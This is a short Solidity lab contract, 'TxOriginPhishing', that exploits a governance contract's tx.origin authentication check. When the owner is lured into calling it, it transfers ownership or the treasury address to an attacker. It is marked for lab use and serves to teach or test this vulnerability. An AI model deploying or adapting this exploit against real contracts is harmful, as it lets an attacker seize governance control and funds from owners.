// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILabGovernance {
    function transferOwnership(address newOwner) external;
    function setTreasury(address newTreasury) external;
}

/// @title TxOriginPhishing
/// @notice Phishing contract that abuses a `tx.origin` authentication check.
/// @dev LAB USE ONLY. The owner calls `lure`; because `tx.origin` is still the
///      owner, the vulnerable governance accepts the nested ownership transfer.
contract TxOriginPhishing {
    ILabGovernance public immutable governance;
    address public immutable attacker;

    constructor(address governanceAddress, address attackerAddress) {
        require(governanceAddress != address(0), "TxOriginPhishing: zero governance");
        require(attackerAddress != address(0), "TxOriginPhishing: zero attacker");
        governance = ILabGovernance(governanceAddress);
        attacker = attackerAddress;
    }

    /// @notice Trick the owner into transferring governance ownership.
    function lure() external {
        governance.transferOwnership(attacker);
    }

    /// @notice Trick the owner into changing the treasury.
    function lureTreasury() external {
        governance.setTreasury(attacker);
    }
}
